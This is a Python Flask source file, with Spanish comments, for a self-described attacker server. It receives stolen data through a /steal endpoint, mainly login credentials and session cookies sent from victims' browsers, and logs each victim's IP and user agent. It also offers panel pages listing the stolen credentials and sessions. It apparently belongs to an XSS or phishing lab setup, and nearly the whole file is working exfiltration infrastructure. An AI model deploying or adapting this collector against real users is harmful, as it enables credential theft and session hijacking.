from flask import Flask, request, jsonify
from flask_cors import CORS
import json
from datetime import datetime
import os

app = Flask(__name__)
CORS(app)  # Permitir CORS para recibir datos

# Almacenar datos robados
stolen_data = []

@app.route('/steal', methods=['POST', 'OPTIONS'])
def steal_data():
    """
    Endpoint para recibir datos robados
    """
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.get_json()
        if not data:
            data = {'raw': request.get_data(as_text=True)}
        
        # Añadir metadata
        data['stolen_at'] = datetime.now().isoformat()
        data['ip'] = request.remote_addr
        data['user_agent'] = request.headers.get('User-Agent', 'Unknown')
        
        # ✅ CLASIFICAR TIPOS DE DATOS ROBADOS
        data_type = data.get('type', 'unknown')
        
        if data_type == 'credentials':
            print(f"🎣 CREDENCIALES ROBADAS:")
            print(f"   Usuario: {data.get('username', 'N/A')}")
            print(f"   Contraseña: {data.get('password', 'N/A')}")
            print(f"   Origen: {data.get('origin', 'N/A')}")
        elif data_type in ['session_cookies', 'current_session']:
            print(f"🍪 COOKIES DE SESIÓN ROBADAS:")
            print(f"   Cookies: {data.get('cookies', 'N/A')}")
            print(f"   URL: {data.get('url', 'N/A')}")
        
        stolen_data.append(data)
        
        return jsonify({
            "status": "success", 
            "message": f"Datos tipo '{data_type}' recibidos correctamente"
        }), 200
    except Exception as e:
        print(f"❌ Error: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/stolen', methods=['GET'])
def view_stolen():
    """
    Ver todos los datos robados
    """
    return jsonify({
        "total_stolen": len(stolen_data),
        "data": stolen_data,
        "timestamp": datetime.now().isoformat()
    })

@app.route('/stolen/latest', methods=['GET'])
def view_latest():
    """
    Ver los últimos 10 datos robados
    """
    return jsonify({
        "latest": stolen_data[-10:] if len(stolen_data) >= 10 else stolen_data,
        "total": len(stolen_data)
    })

@app.route('/clear', methods=['POST'])
def clear_stolen():
    """
    Limpiar datos robados
    """
    global stolen_data
    count = len(stolen_data)
    stolen_data = []
    return jsonify({
        "message": f"Se eliminaron {count} registros",
        "cleared_at": datetime.now().isoformat()
    })

@app.route('/health', methods=['GET'])
def health_check():
    """
    Health check del servidor atacante
    """
    return jsonify({
        "status": "active",
        "service": "atacante",
        "port": 5004,
        "stolen_records": len(stolen_data),
        "endpoints": ["/steal", "/stolen", "/clear", "/health"]
    })

@app.route('/', methods=['GET'])
def index():
    """
    Página principal del servidor atacante
    """
    return f"""
    <html>
    <head><title>🚨 Servidor del Atacante</title></head>
    <body style="font-family: Arial, sans-serif; margin: 40px;">
        <h1>🚨 Servidor del Atacante Activo</h1>
        <p><strong>Puerto:</strong> 5004</p>
        <p><strong>Datos robados:</strong> {len(stolen_data)} registros</p>
        
        <h2>📡 Endpoints disponibles:</h2>
        <ul>
            <li><a href="/stolen">/stolen</a> - Ver todos los datos robados</li>
            <li><a href="/stolen/latest">/stolen/latest</a> - Ver últimos 10 registros</li>
            <li><a href="/health">/health</a> - Estado del servidor</li>
            <li>/steal (POST) - Recibir datos robados</li>
            <li>/clear (POST) - Limpiar datos</li>
        </ul>
        
        <h2>💻 Comandos de prueba:</h2>
        <code>
        curl -X POST http://localhost:5004/steal \\<br>
        &nbsp;&nbsp;-H "Content-Type: application/json" \\<br>
        &nbsp;&nbsp;-d '{{"test": "data"}}'
        </code>
    </body>
    </html>
    """

@app.route('/stolen/credentials', methods=['GET'])
def view_credentials():
    """
    Ver solo las credenciales robadas
    """
    credentials = [item for item in stolen_data if item.get('type') == 'credentials']
    return jsonify({
        "total_credentials": len(credentials),
        "credentials": credentials
    })

@app.route('/stolen/sessions', methods=['GET'])
def view_sessions():
    """
    Ver solo las sesiones robadas
    """
    sessions = [item for item in stolen_data if item.get('type') in ['session_cookies', 'current_session']]
    return jsonify({
        "total_sessions": len(sessions),
        "sessions": sessions
    })

if __name__ == '__main__':
    print("🚨 Servidor del atacante iniciado")
    print("📡 Puerto: 5004")
    print("👁️ Panel de control: http://localhost:5004")
    print("📊 Ver datos robados: http://localhost:5004/stolen")

    # Ejecutar en todas las interfaces para Docker
    app.run(host='0.0.0.0', port=5004, debug=True)